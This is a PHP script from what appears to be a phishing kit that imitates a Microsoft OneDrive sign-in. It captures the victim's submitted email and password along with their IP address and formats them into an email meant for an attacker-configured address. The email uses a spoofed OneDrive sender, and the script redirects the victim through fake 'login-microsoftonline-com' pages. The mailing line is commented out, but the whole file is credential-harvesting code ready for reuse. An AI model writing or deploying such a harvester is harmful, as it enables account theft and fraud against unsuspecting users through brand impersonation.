<?php
session_start();
include "config.php";

if(trim($_POST['userid']) == "" ){
 
   header('Location: noemail.php?login-microsoftonline-com_OneDrive0009');
   exit(); 
}

    $pfw_ip= $_SERVER['REMOTE_ADDR'];
	$emailto = $config_email;
	$email_from = "OneDrive@violetlines.com";
    $email_subject = "$pfw_ip OneDrive info.";
    
	$email = $_POST['userid'];
	$password = $_POST['password'];
	

    $email_message = "Received details below for OneDrive\n\n";
    function clean_string($string) {
 
      $bad = array("content-type","bcc:","to:","cc:","href");
 
      return str_replace($bad,"",$string);
 
    }  
	

    $email_message .= "<==============>OneDrive. login Details <==============>\n";  
    $email_message .= "Username: ==========>  ".clean_string($email)."\n";  
    $email_message .= "Password: ============>  ".clean_string($password)."\n";
    $email_message .= "\n";
	
	
	
// create email headers
 
$headers = 'From: '.$email_from."\r\n".
 
'Reply-To: '.$emailto."\r\n" .
 
'X-Mailer: PHP/' . phpversion();
 
//@mail($emailto, $email_subject, $email_message, $headers); 
 // create session variable data
$_SESSION["userid"]=$_POST['userid'];

header("location: pass.php?login-microsoftonline-com_OneDrive0009");
?>
 
<!-- include your own success html here -->
 

 
 
